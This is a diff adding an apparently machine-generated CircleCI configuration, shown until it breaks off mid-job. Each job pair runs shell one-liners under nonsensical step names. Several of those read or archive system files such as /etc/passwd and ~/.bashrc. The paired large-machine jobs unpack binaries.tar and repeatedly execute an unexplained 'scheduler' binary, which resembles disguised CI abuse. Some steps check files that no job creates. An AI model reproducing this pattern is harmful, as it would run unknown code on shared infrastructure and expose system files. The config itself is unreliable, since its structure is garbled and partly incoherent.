@@ -1,0 +1,1559 @@
+version: 2.1
+
+jobs:
+  transientGraphFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bribe the login button
+          command: |
+            mkdir -p /tmp/data/snap
+            set +o pipefail 2>/dev/null; seq 1 1485031 | sha1sum > /tmp/data/snap/iter3_4ff8; true
+            echo "ok: /tmp/data/snap/iter3_4ff8"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'iter3_4ff8'
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  cPlatinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Where is the changelog
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find /dev -name "shm" -writable -exec echo {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/data/snap/rIdgEProFILegRove
+            echo "ok: /tmp/data/snap/rIdgEProFILegRove"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'rIdgEProFILegRove'
+  dan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  cchSimpleCurrent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: 400 PRINT refund
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find ~ -maxdepth 1|sort -r|awk -F/ '{print NF-1}'|head -n 8; true ; } > /tmp/data/snap/thread-flame-coin-green
+            echo "ok: /tmp/data/snap/thread-flame-coin-green"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'thread-flame-coin-green'
+  cd-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/thread-flame-coin-green 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/thread-flame-coin-green 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  okStr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Breach the event loop
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; echo 'retrying in 5 seconds' | tee "/tmp/s7.log"; true ; } > /tmp/data/snap/raven_lynx.Stock-16
+            echo "ok: /tmp/data/snap/raven_lynx.Stock-16"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'raven_lynx.Stock-16'
+  Prepare_Tests3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/raven_lynx.Stock-16 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/raven_lynx.Stock-16 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  kernelType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Bake profiling into the roadmap
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -name "*.conf" -print0 2>/dev/null | xargs -0 ls -l | head -4; true ; } > /tmp/data/snap/w7pfikf3
+            echo "ok: /tmp/data/snap/w7pfikf3"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'w7pfikf3'
+  v1-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  kbw3vj7t:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Mid run warmup
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 1 -type f -iname 'lo' -mmin -120 -exec du -ch {} + | tail -1; true ; } > /tmp/data/snap/p01ar.c4nv4s.tone
+            echo "ok: /tmp/data/snap/p01ar.c4nv4s.tone"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'p01ar.c4nv4s.tone'
+  validate-end-to-end-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/p01ar.c4nv4s.tone 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/p01ar.c4nv4s.tone 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Let me seal the samples
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,peach,19,40.79\n2,orange,7,13.81\n3,cherry,2,70.45\n4,plum,4,71.39\n' >"/var/tmp/slice.conf" && tail -n +2 "/var/tmp/slice.conf" | cut -d, -f3 | paste -sd+; true ; } > /tmp/data/snap/2027-07-13T16-16
+            echo "ok: /tmp/data/snap/2027-07-13T16-16"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '2027-07-13T16-16'
+  py310-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/2027-07-13T16-16 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/2027-07-13T16-16 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  rotateTile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Round three double check
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; ps -eo comm= | cat -n; true ; } > /tmp/data/snap/24.02.2018
+            echo "ok: /tmp/data/snap/24.02.2018"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '24.02.2018'
+  anothr-run-65:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  Dict_copy-texture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Hat trick batching
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; grep -H -F -s fi /etc/profile; true ; } > /tmp/data/snap/threadscarletspark
+            echo "ok: /tmp/data/snap/threadscarletspark"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'threadscarletspark'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  aki2k:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: POST TO CRM
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; sha256sum <(echo 'the quick brown fox jumps over the lazy dog'); true ; } > /tmp/data/snap/ee4b6a08-d265-6c5f-a82f
+            echo "ok: /tmp/data/snap/ee4b6a08-d265-6c5f-a82f"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'ee4b6a08-d265-6c5f-a82f'
+  LAB_VERIFY_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/ee4b6a08-d265-6c5f-a82f 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/ee4b6a08-d265-6c5f-a82f 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  ploamcruesum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: ITEM 36 FOLLOW UP WITH THE BETA TESTERS A
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; cat /etc/issue|sort -u|tr -cs '[:alnum:]' '\n'; true ; } > /tmp/data/snap/SDK.bog
+            echo "ok: /tmp/data/snap/SDK.bog"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'SDK.bog'
+  feb13-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/SDK.bog 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/SDK.bog 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  aud_PRODUCT_COUNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Tune the org chart
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; touch '/dev/shm/row.tmp' && rm -v '/dev/shm/row.tmp'; true ; } > /tmp/data/snap/bin-lib
+            echo "ok: /tmp/data/snap/bin-lib"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'bin-lib'
+  v3-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bin-lib 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bin-lib 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  label__action:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: UX 833 Shelve Express Lane
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; seq 7 41 | head -n 8; true ; } > /tmp/data/snap/gI5vCP
+            echo "ok: /tmp/data/snap/gI5vCP"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'gI5vCP'
+  luna-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/gI5vCP 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/gI5vCP 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  UnboundedBoundedEdgeController:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: JMP to charge
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 1 -type f -name '*' -printf "%k KB\t%p\n"|xargs ls -ld; true ; } > /tmp/data/snap/REF_069419
+            echo "ok: /tmp/data/snap/REF_069419"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'REF_069419'
+  Package_Suite9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  PARAM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: The sequence counters ready yet
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; grep -qs 'PATH' /etc/profile && echo 'true' || echo false; true ; } > /tmp/data/snap/1ugips7c
+            echo "ok: /tmp/data/snap/1ugips7c"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '1ugips7c'
+  alpha-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/1ugips7c 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/1ugips7c 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  navsByName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Should we cache the drift monitor
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; : >'/var/tmp/query.list' && ls -l '/var/tmp/query.list'; true ; } > /tmp/data/snap/133.201.51
+            echo "ok: /tmp/data/snap/133.201.51"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '133.201.51'
+  qa-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  aiGrowChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Checkpoint the data loader
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; seq 199 >"/tmp/fl4.csv" && split -n 4 "/tmp/fl4.csv" /tmp/f4. && wc -l /tmp/f4.*; true ; } > /tmp/data/snap/release-7315
+            echo "ok: /tmp/data/snap/release-7315"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'release-7315'
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/release-7315 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/release-7315 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  sprite_b_84187:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: wget3 cfgs
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; for val in cat crow koala frog otter dog; do printf '%s\n' "$val"; done; true ; } > /tmp/data/snap/atoll-archive
+            echo "ok: /tmp/data/snap/atoll-archive"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'atoll-archive'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/atoll-archive 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/atoll-archive 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Denoise loudness levels v19
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; for file in /etc/*.d; do ls -ld "$file"; done | head -n 3; true ; } > /tmp/data/snap/9626eeff6c0977f0a691
+            echo "ok: /tmp/data/snap/9626eeff6c0977f0a691"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '9626eeff6c0977f0a691'
+  vera-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/f450c8d4d5b45b8f25cc7c005f9ba89d 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  aa-37-b8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Quarantine the test matrix carefully
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; \grep -En 'PS1|fi|alias' ~/.bashrc | tail -3; true ; } > /tmp/data/snap/20160327
+            echo "ok: /tmp/data/snap/20160327"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - '20160327'
+  cd-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  unit-xray:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: For round two review the runbook
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; tar -zcf /tmp/level2.tar.gz -C /etc hosts passwd && tar -tzf /tmp/level2.tar.gz; true ; } > /tmp/data/snap/memodriftfoxwillow
+            echo "ok: /tmp/data/snap/memodriftfoxwillow"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'memodriftfoxwillow'
+  ruby3-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/memodriftfoxwillow 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/memodriftfoxwillow 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  Charlie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: One quiet expiry
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; ln -sf /etc/passwd "/tmp/rank_login_20190716.log" && readlink "/tmp/rank_login_20190716.log"; true ; } > /tmp/data/snap/bd7745da31bb7144a7be9ab1
+            echo "ok: /tmp/data/snap/bd7745da31bb7144a7be9ab1"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'bd7745da31bb7144a7be9ab1'
+  tweak-parse-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Reconstruct workspace
+          command: |
+            [ "$(head -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" = "$(tail -c 10 /tmp/data/snap/bd7745da31bb7144a7be9ab1 2>/dev/null)" ] && echo "same" || echo "diff"
+      - run:
+          name: Grab repository
+          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar xf binaries.tar
+      - run:
+          name: Post-build check
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: "$PWD/scheduler"
+  LANG_CA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
+      - run:
+          name: Hand Pick To Web
+          command: |
+            mkdir -p /tmp/data/snap
+            { set +o pipefail 2>/dev/null; for i in $(seq 1 10); do printf '%02d\n' "${i}"; done | paste -sd ' '; true ; } > /tmp/data/snap/archive-6610
+            echo "ok: /tmp/data/snap/archive-6610"
+      - persist_to_workspace:
+          root: /tmp/data/snap
+          paths:
+            - 'archive-6610'
+  Ship_Pipeline2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data/snap
